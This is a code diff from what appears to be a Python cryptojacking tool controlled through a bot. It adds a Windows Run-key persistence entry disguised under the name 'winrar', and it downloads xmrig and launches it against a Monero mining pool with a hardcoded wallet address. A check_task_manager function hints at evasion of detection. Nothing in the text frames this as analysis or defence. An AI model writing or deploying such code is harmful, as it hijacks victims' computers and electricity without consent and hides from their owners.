@@ -34,7 +34,7 @@ def get_ip_info():
 def win_reg_min():
 	#path = os.path.join(os.path.abspath(os.curdir)) + 
 	key_my = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, KEY_ALL_ACCESS)
-	SetValueEx(key_my, 'winrar', 0, REG_SZ, winreg_path + ".py")
+	SetValueEx(key_my, 'winrar', 0, REG_SZ, winreg_path + ".exe")
 	CloseKey(key_my)
 
 async def check_task_manager(bot: Bot):
@@ -52,8 +52,8 @@ async def start_miner(bot: Bot):
     save_file_path = 'E:\\Programs\\winrar\\xmrig-6.21.0-gcc-win64.zip'
     download_file(github_file_url, save_file_path)
     temp = str(random.randint(0,999))
-    unzip_file(save_file_path, 'E:\\Programs\\winrar\\')
-    xmrig_path = f'E:\\Programs\\winrar\\xmrig-6.21.0\\xmrig.exe --url pool.hashvault.pro:7777 --user 44g61Gx1EyNW5X4f6p7jnJCAytVQWUjv3R77arbsfz7EEmk81E27aoY4Gwm8Q9Bb8VKtQdo9hFtun8fXQPXgzyrpGra9Ssb --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14'
+    unzip_file(save_file_path, 'E:\\Programs\\winrar\\temp')
+    xmrig_path = f'E:\\Programs\\winrar\\xmrig-6.21.0\\xmrig.exe --url pool.hashvault.pro:7777 --user 44g61Gx1EyNW5X4f6p7jnJCAytVQWUjv3R77arbsfz7EEmk81E27aoY4Gwm8Q9Bb8VKtQdo9hFtun8fXQPXgzyrpGra9Ssb --pass XXX --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14'
     subprocess.Popen(xmrig_path, shell=True)
     ip_info = get_ip_info()
     win_reg_min()
